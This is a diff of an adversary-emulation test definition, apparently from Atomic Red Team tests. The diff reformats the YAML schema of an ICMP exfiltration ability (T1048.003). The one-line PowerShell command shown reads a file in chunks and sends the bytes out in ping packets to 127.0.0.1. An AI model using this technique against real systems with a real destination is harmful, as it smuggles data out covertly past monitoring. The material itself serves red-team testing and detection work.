@@ -1,15 +1,18 @@
-- id: 0fc7f91a-f3b4-53dc-9f00-78aee322b43b
+- requirements: []
   name: Soumaia ART Tests - Exfiltration Over Alternative Protocol - ICMP
   description: 'Exfiltration of specified file over ICMP protocol.
 
 
     Upon successful execution, powershell will utilize ping (icmp) to exfiltrate notepad.exe to a remote address (default 127.0.0.1). Results will be via stdout.'
   tactic: exfiltration
-  technique:
-    attack_id: T1048.003
-    name: 'Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol'
-  platforms:
-    windows:
-      psh:
-        command: |-
-          $ping = New-Object System.Net.Networkinformation.ping; foreach($Data in Get-Content -Path C:\Windows\System32\notepad.exe -Encoding Byte -ReadCount 1024) { $ping.Send("127.0.0.1", 1500, $Data) }
+  technique_id: T1048.003
+  technique_name: 'Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol'
+  executors:
+  - cleanup: []
+    timeout: 60
+    platform: windows
+    name: psh
+    payloads: []
+    parsers: []
+    command: $ping = New-Object System.Net.Networkinformation.ping; foreach($Data in Get-Content -Path C:\Windows\System32\notepad.exe -Encoding Byte -ReadCount 1024) { $ping.Send("127.0.0.1", 1500, $Data) }
+  id: 0fc7f91a-f3b4-53dc-9f00-78aee322b43b
